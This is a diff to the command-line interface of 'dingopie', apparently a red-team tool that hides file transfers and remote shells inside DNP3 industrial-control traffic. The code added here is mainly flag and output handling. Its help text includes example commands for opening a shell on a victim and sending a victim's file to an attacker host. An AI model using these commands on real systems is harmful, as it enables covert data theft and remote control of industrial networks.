@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/nblair2/dingopie/internal"
+	"github.com/nblair2/dingopie/internal/inject"
 	"github.com/spf13/cobra"
 	"github.com/spf13/pflag"
 )
@@ -20,6 +21,23 @@ const (
 	groupRole   = "role"
 	groupMode   = "mode"
 	groupAction = "action"
+
+	titleRole   = "Roles:"
+	titleMode   = "Modes:"
+	titleAction = "Actions:"
+
+	useSend    = "send"
+	useRecv    = "receive"
+	useShell   = "shell"
+	useConnect = "connect"
+)
+
+// Flag defaults.
+const (
+	defaultServerPort    = 20000
+	defaultPoints        = 8
+	defaultPointVariance = 0.25
+	receiveFileMode      = 0o400
 )
 
 // ==================================================================
@@ -39,13 +57,17 @@ var (
 
 	// shell.
 	command string
+
+	// inject.
+	clientIP   string
+	clientPort int
 )
 
 // ==================================================================
 // Helper Functions
 // ==================================================================
 
-func getData(file string, args []string) ([]byte, error) {
+func getData(cmd *cobra.Command, file string, args []string) ([]byte, error) {
 	if file != "" {
 		//nolint: gosec // G304 opening file provided by user
 		b, err := os.ReadFile(file)
@@ -71,7 +93,7 @@ func getData(file string, args []string) ([]byte, error) {
 			return nil, errors.New("no data provided to send (stdin empty)")
 		}
 
-		fmt.Printf(">> Message read from stdin\n")
+		cmd.Printf(">> Message read from stdin\n")
 
 		return b, nil
 	}
@@ -79,7 +101,7 @@ func getData(file string, args []string) ([]byte, error) {
 	if len(args) == 1 {
 		data := []byte(args[0])
 
-		fmt.Printf(">> Message read from command line\n")
+		cmd.Printf(">> Message read from command line\n")
 
 		return data, nil
 	} else if len(args) > 1 {
@@ -89,6 +111,45 @@ func getData(file string, args []string) ([]byte, error) {
 	return nil, errors.New("no data provided to send")
 }
 
+// openOutFile opens the file flag path for exclusive writing.
+// Returns nil when no --file flag was given.
+func openOutFile(cmd *cobra.Command) *os.File {
+	if file == "" {
+		return nil
+	}
+
+	f, err := os.OpenFile( //nolint:gosec
+		file, os.O_WRONLY|os.O_CREATE|os.O_EXCL, receiveFileMode,
+	)
+	if err != nil {
+		cmd.Printf("Error opening file %s: %v\n", file, err)
+		os.Exit(1)
+	}
+
+	return f
+}
+
+// writeOut writes data to f and closes it, or prints it to stdout when f is nil.
+func writeOut(cmd *cobra.Command, f *os.File, data []byte) {
+	if f == nil {
+		cmd.Printf(">> Message: %s\n", string(data))
+
+		return
+	}
+
+	_, writeErr := f.Write(data)
+
+	f.Close()
+
+	if writeErr != nil {
+		cmd.Printf("Error writing to file: %v\n", writeErr)
+		cmd.Printf(">> Data received: %s\n", string(data))
+		os.Exit(1)
+	}
+
+	cmd.Printf(">> Data written to %s\n", file)
+}
+
 // ==================================================================
 // User Interface
 // ==================================================================
@@ -96,7 +157,7 @@ func getData(file string, args []string) ([]byte, error) {
 var mustDisplayFlag = []string{"server-port", "points", "point-variance", "wait", "command"}
 
 func printCommand(cmd *cobra.Command) {
-	fmt.Println(
+	cmd.Println(
 		strings.ReplaceAll(
 			fmt.Sprintf("============= %s =============", cmd.CommandPath()),
 			" ",
@@ -106,13 +167,13 @@ func printCommand(cmd *cobra.Command) {
 }
 
 func dumpFlags(cmd *cobra.Command) {
-	fmt.Println(">> Flags:")
+	cmd.Println(">> Flags:")
 	cmd.Flags().VisitAll(func(f *pflag.Flag) {
 		if !f.Changed && !slices.Contains(mustDisplayFlag, f.Name) {
 			return
 		}
 
-		fmt.Printf("\t% 14s:\t%s\n", f.Name, f.Value)
+		cmd.Printf("\t% 14s:\t%s\n", f.Name, f.Value)
 	})
 }
 
@@ -122,8 +183,44 @@ func preRun(cmd *cobra.Command) {
 }
 
 func postRun(cmd *cobra.Command) {
-	fmt.Printf(">> KTHXBI\n")
+	cmd.Printf(">> KTHXBI\n")
 	printCommand(cmd)
+}
+
+// ==================================================================
+// Inject
+// ==================================================================
+
+func runInjectSend(
+	cmd *cobra.Command,
+	args []string,
+	localAddr, remoteAddr string,
+	localPort, remotePort int,
+) {
+	data, err := getData(cmd, file, args)
+	if err != nil {
+		cmd.Printf("Error getting data: %v\n", err)
+		os.Exit(1)
+	}
+
+	err = inject.Send(cmd.OutOrStdout(), localAddr, remoteAddr, localPort, remotePort, key, data)
+	if err != nil {
+		cmd.Printf("Error with inject send: %v\n", err)
+		os.Exit(1)
+	}
+}
+
+func runInjectReceive(cmd *cobra.Command, localAddr, remoteAddr string, localPort, remotePort int) {
+	f := openOutFile(cmd)
+
+	data, err := inject.Receive(
+		cmd.OutOrStdout(), localAddr, remoteAddr, localPort, remotePort, key,
+	)
+	if err != nil {
+		cmd.Printf("Error with inject receive: %v\nAttempting to output what data we have\n", err)
+	}
+
+	writeOut(cmd, f, data)
 }
 
 // ==================================================================
@@ -154,7 +251,14 @@ an interactive shell ('shell' | 'connect').
     $ dingopie server direct shell
     # on attacker
     $ dingopie.exe client direct connect -i 131.43.110.7
-    dingopie>`,
+    dingopie>
+		
+  Transfer a file over an existing DNP3 connection:
+    # on victim
+    $ dingopie server inject send -f /tmp/garbage.dat -k "hack the planet" -i 2.6.0.0 -p 20002 -j 31.33.7.95
+    # on attacker or intermediary
+    $ dingopie client inject receive -f ~/da-vinci-source.dat -k "hack the planet" -i 2.6.0.0 -p 20002 -j 31.33.7.95
+`,
 	PersistentPreRun: func(cmd *cobra.Command, _ []string) {
 		preRun(cmd)
 	},
@@ -165,20 +269,22 @@ an interactive shell ('shell' | 'connect').
 
 // Execute - dingopie.
 func Execute() {
+	rootCmd.SetOut(os.Stdout)
+
 	err := rootCmd.Execute()
 	if err != nil {
-		fmt.Printf("Error executing dingopie: %v\n", err)
 		os.Exit(1)
 	}
 }
 
 func init() {
-	rootCmd.AddGroup(&cobra.Group{ID: groupRole, Title: "Roles:"})
+	rootCmd.AddGroup(&cobra.Group{ID: groupRole, Title: titleRole})
 	rootCmd.AddCommand(clientCmd, serverCmd)
 	rootCmd.PersistentFlags().
 		StringVarP(&key, "key", "k", "Setec Astronomy", "encryption key to garble data")
 	rootCmd.PersistentFlags().StringVarP(&serverIP, "server-ip", "i", "", "server IP address")
-	rootCmd.PersistentFlags().IntVarP(&serverPort, "server-port", "p", 20000, "server port")
+	rootCmd.PersistentFlags().
+		IntVarP(&serverPort, "server-port", "p", defaultServerPort, "server port")
 	// A custom usage template is the least of all evils that I have found to allow the unique structure
 	// of requiring role, mode, and action in the command line, while still providing clear help messages.
 	//nolint: lll // template
@@ -194,6 +300,5 @@ func init() {
 {{if .HasAvailableInheritedFlags}}Global Flags:
 {{.InheritedFlags.FlagUsages | trimTrailingWhitespaces}}{{end}}{{if .HasExample}}Examples:
 {{.Example}}{{end}}
-
 `)
 }
